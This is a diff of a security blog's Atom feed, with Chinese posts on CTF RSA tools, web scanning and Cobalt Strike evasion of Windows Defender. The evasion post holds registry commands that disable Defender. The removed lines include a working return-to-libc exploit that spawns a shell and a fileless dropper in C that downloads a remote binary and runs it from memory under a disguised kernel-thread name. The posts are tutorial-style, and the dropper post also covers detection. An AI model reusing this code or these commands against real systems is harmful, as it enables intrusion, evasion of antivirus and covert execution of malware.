@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2022-04-14T13:16:56.228Z</updated>
+  <updated>2022-04-19T09:41:10.450Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,55 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF之RSA笔记</title>
+    <link href="http://kevien.github.io/2022/04/19/CTF%E4%B9%8BRSA%E7%AC%94%E8%AE%B0/"/>
+    <id>http://kevien.github.io/2022/04/19/CTF之RSA笔记/</id>
+    <published>2022-04-19T09:34:26.000Z</published>
+    <updated>2022-04-19T09:41:10.450Z</updated>
+    
+    <content type="html"><![CDATA[<p>###</p>
+<h3 id="sagemath"><a href="#sagemath" class="headerlink" title="sagemath"></a>sagemath</h3><ul>
+<li><a href="https://www.jianshu.com/p/47ec09e870c0" target="_blank" rel="noopener">sagemath安装</a></li>
+<li>有时候需要使用crypto库那么需要pip安装一下   pip install pycryptodome，注意 1.需要在sagemath shell中执行 2.可能需要fq 3.需要管理员权限执行</li>
+<li>sagemath 的目录和windows的目录关系，直接看图吧<br><img src="/2022/04/19/CTF之RSA笔记/sagemath-path.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;###&lt;/p&gt;
+&lt;h3 id=&quot;sagemath&quot;&gt;&lt;a href=&quot;#sagemath&quot; class=&quot;headerlink&quot; title=&quot;sagemath&quot;&gt;&lt;/a&gt;sagemath&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.jianshu.
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>web扫描笔记</title>
+    <link href="http://kevien.github.io/2022/04/17/web%E6%89%AB%E6%8F%8F/"/>
+    <id>http://kevien.github.io/2022/04/17/web扫描/</id>
+    <published>2022-04-17T11:49:39.000Z</published>
+    <updated>2022-04-17T12:05:34.644Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><ul>
+<li>作为一个安全从业人员，必须的有自己的扫描器工具，当然可以自己开发，也可以使用现有的成熟方案，之前用awvs比较多，vps上安装docker，现在awvs也都有docker版本的且为破解版的，pull一下很方便，当时也有不方便的地方，就是<br>扫描速度比较慢，可能很早之前感兴趣的目标放进去了，过一段时间都快忘记了，所以并不太具有“实效”性。而发现现在使用xray+brup的这种组合比较好，被动式扫描，会基于你点击的链接进行扫描，我们一般在测试某个网站的时候必定使用的工具就是<br>burpsuite，可以使用burpsuite的重放功能对目标进行手动测试，而且现在的burp(破解版)也有扫描的功能，也比较强大，然后联动xray，有时候就一直开着xray在那里一顿操作，xray都会把你点击的url进行扫描，相当于多了一个帮手帮你去检测。</li>
+<li>关于xray如何联动burp网上有很多的教程，这里就不介绍了。<br><img src="/2022/04/17/web扫描/xray.png" alt=""><br><img src="/2022/04/17/web扫描/burpscan.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;作为一个安全从业人员，必须的有自己的扫描器工具，当然可以自己开发，也可以使用现有的成熟方案，之前用awv
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>捆绑钓鱼</title>
@@ -49,11 +98,11 @@
     <link href="http://kevien.github.io/2022/04/12/cs%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
     <id>http://kevien.github.io/2022/04/12/cs免杀上线及使用注意事项/</id>
     <published>2022-04-12T10:21:05.000Z</published>
-    <updated>2022-04-13T12:47:28.792Z</updated>
+    <updated>2022-04-20T07:45:39.522Z</updated>
     
     <content type="html"><![CDATA[<h2 id="cs免杀"><a href="#cs免杀" class="headerlink" title="cs免杀"></a>cs免杀</h2><ul>
 <li>在上一篇cobaltstrike cdn上线隐藏c2 ip 之后，发现目标机器是win10，而win10一般都会开启windows defender（后面都简称wd）以及uac。</li>
-<li>第一个问题就是如果绕过windows defender，网上有很多相关的免杀技术文章，有些已经过时有些还可以使用，我在测试了几个之后发现这篇文章介绍的技术目前还是可以bypass wd以及某数字杀软的，参考文章<a href="https://www.anquanke.com/post/id/262666" target="_blank" rel="noopener">CS shellcode内存加载器免杀及实现</a>。需要使用golang进行编译，注意编译时候添加选项  -ldflags=”-H windowsgui”，这样就没有黑框了。</li>
+<li>第一个问题就是如果绕过windows defender，网上有很多相关的免杀技术文章，有些已经过时有些还可以使用，我在测试了几个之后发现这篇文章介绍的技术目前还是可以bypass wd以及某数字杀软的，参考文章<a href="https://www.anquanke.com/post/id/262666" target="_blank" rel="noopener">CS shellcode内存加载器免杀及实现</a>。需要使用golang进行编译，注意编译时候添加选项  -ldflags=”-H windowsgui”，这样就没有黑框了。当然还可以进一步给程序加壳，加壳的话可以使用safengine。<br><img src="/2022/04/12/cs免杀上线及使用注意事项/safengine.png" alt=""></li>
 <li><p>第二个问题就是我们接收到的beacon一般是管理员组的用户，但想要执行一些特殊操作，比如想要执行hashdump或者其他特权命令的时候,需要bypass uac.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 1 /t REG_DWORD /f，</span><br><span class="line">开启wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 0 /t REG_DWORD /f）</span><br></pre></td></tr></table></figure>
 </li>
@@ -648,7 +697,7 @@
     <link href="http://kevien.github.io/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
     <id>http://kevien.github.io/2018/07/15/python虚拟环境安装和使用/</id>
     <published>2018-07-15T05:30:41.000Z</published>
-    <updated>2020-03-14T10:10:48.000Z</updated>
+    <updated>2022-04-20T08:32:02.490Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>Mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三方包安装需要root权限可能导致的安全问题等，所有就有了python虚拟环境，这里主要记录一下笔者在安装和使用pyenv以及virtualenv过程。<h4 id="pyenv安装和使用"><a href="#pyenv安装和使用" class="headerlink" title="pyenv安装和使用"></a>pyenv安装和使用</h4></li>
@@ -675,7 +724,9 @@
 <li>安装对应版本的第三方包 pip install django==1.10<br><img src="/2018/07/15/python虚拟环境安装和使用/virtualenv.png" alt=""></li>
 <li>如上图所示，就相当于进一步定制化了环境（python2.7.14 and django==1.10）。</li>
 <li>此外和上面配置pycharm一样对pycharm进行相应开发环境的配置。</li>
-<li>退出当前的虚拟环境 pyenv deactivate xxx<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><em><a href="https://medium.com/@jordanthomasg/python-development-on-macos-with-pyenv-virtualenv-ec583b92934c" target="_blank" rel="noopener">Python Development on macOS with pyenv-virtualenv</a>
+<li>退出当前的虚拟环境 pyenv deactivate xxx<h4 id="python常见问题"><a href="#python常见问题" class="headerlink" title="python常见问题"></a>python常见问题</h4></li>
+<li>windows下pip安装速度慢解决方法 可以在使用pip的时候加参数-i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></li>
+<li>例如：pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a> pyspider，这样就会从清华这边的镜像去安装pyspider库。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><em><a href="https://medium.com/@jordanthomasg/python-development-on-macos-with-pyenv-virtualenv-ec583b92934c" target="_blank" rel="noopener">Python Development on macOS with pyenv-virtualenv</a>
 </em><a href="https://www.cnblogs.com/kevingrace/p/10130801.html" target="_blank" rel="noopener">Python多版本管理器-pyenv 介绍及部署记录</a></li>
 </ul>
 ]]></content>
@@ -926,136 +977,6 @@
     
       &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>通过return-to-libc绕过NX-bit</title>
-    <link href="http://kevien.github.io/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
-    <id>http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/</id>
-    <published>2018-02-26T15:13:31.000Z</published>
-    <updated>2018-11-19T15:59:02.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
-<li>本次的测试环境是ubuntu14.04（X86).</li>
-<li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li>
-<li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="noopener">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，这篇文章就将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> //vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line"> char buf[256]; /* [1] */ </span><br><span class="line"> strcpy(buf,argv[1]); /* [2] */</span><br><span class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</span><br><span class="line"> fflush(stdout);  /* [4] */</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</span><br><span class="line">$sudo chown root vuln</span><br><span class="line">$sudo chgrp root vuln</span><br><span class="line">$sudo chmod +s vuln</span><br></pre></td></tr></table></figure>
-<ul>
-<li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li>
-<li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li>
-<li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li>
-<li><p>漏洞利用代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import struct</span><br><span class="line">from subprocess import call</span><br><span class="line"></span><br><span class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </span><br><span class="line">#For example system address = libc base address + system offset</span><br><span class="line">#where </span><br><span class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</span><br><span class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</span><br><span class="line"></span><br><span class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</span><br><span class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</span><br><span class="line"></span><br><span class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </span><br><span class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </span><br><span class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</span><br><span class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</span><br><span class="line"></span><br><span class="line">#endianess conversion</span><br><span class="line">def conv(num):</span><br><span class="line"> return struct.pack(&quot;&lt;I&quot;,num)</span><br><span class="line">buf = &quot;A&quot; * 268</span><br><span class="line">buf += conv(system)</span><br><span class="line">buf += conv(exit)</span><br><span class="line">buf += conv(system_arg)</span><br><span class="line"></span><br><span class="line">print &quot;Calling vulnerable program&quot;</span><br><span class="line">call([&quot;./vuln&quot;, buf])</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p>
-</li>
-<li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="noopener">Bypassing NX bit using return-to-libc</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;读此文章之前建议先读一下这篇文章&lt;a href=&quot;https://kevien.github.io/2017/08/16/lin
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>linux一种无文件后门技巧(译文)</title>
-    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7(%E8%AF%91%E6%96%87)/"/>
-    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/</id>
-    <published>2018-02-20T03:51:50.000Z</published>
-    <updated>2019-01-09T08:56:03.000Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原文链接：&lt;https://0x00sec.org/t/super-stealthy-droppers/3715&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="noopener">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
-</li>
-<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们系统更加的安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
-<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="noopener">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
-<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
-<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
-<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
-<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
-<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
-<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="noopener">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
-<ul>
-<li><p>让我们先来看一下这个代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define __NR_memfd_create 319</span><br><span class="line">#define MFD_CLOEXEC 1</span><br><span class="line"></span><br><span class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</span><br><span class="line">    return syscall(__NR_memfd_create, name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern char        **environ;</span><br><span class="line"></span><br><span class="line">int main (int argc, char **argv) &#123;</span><br><span class="line">  int                fd, s;</span><br><span class="line">  unsigned long      addr = 0x0100007f11110002;</span><br><span class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</span><br><span class="line">  char               buf[1024];</span><br><span class="line"></span><br><span class="line">  // Connect</span><br><span class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</span><br><span class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</span><br><span class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  while (1) &#123;</span><br><span class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</span><br><span class="line">      write (fd, buf, 1024);</span><br><span class="line">    &#125;</span><br><span class="line">  close (s);</span><br><span class="line">  </span><br><span class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
-<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
-<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="noopener">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
-<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
-<li>我使用了libc的syscall去对memfd_create进行了简单封装。</li>
-<li>这个程序主要做了下面的事情</li>
-<li>1.创建了一个TCP socket</li>
-<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = 01 00 00  7f   1111  0002;</span><br><span class="line">        1. 0. 0.127   1111  0002;</span><br><span class="line">       +------------+------+----</span><br><span class="line">         IP Address | Port | Family</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>3.创建一个内存文件</p>
-</li>
-<li>4.从socket读取数据写入到内存文件</li>
-<li>5.一旦文件传输完毕，运行内存文件</li>
-<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
-<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
-<li><p>在控制台我们运行下面的命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/xeye.png" alt=""></p>
-<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
-<li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ps axe</span><br><span class="line">(...)</span><br><span class="line"> 2126 ?        S      0:00 [kworker/0:0]</span><br><span class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
-<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
-<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当隐蔽的。</li>
-<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/lsof.png" alt=""></li>
-<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
-<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
-<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
-<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
-<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">  close (fd);</span><br><span class="line"></span><br><span class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
-<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
-<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NOTES</span><br><span class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</span><br></pre></td></tr></table></figure>
-</li>
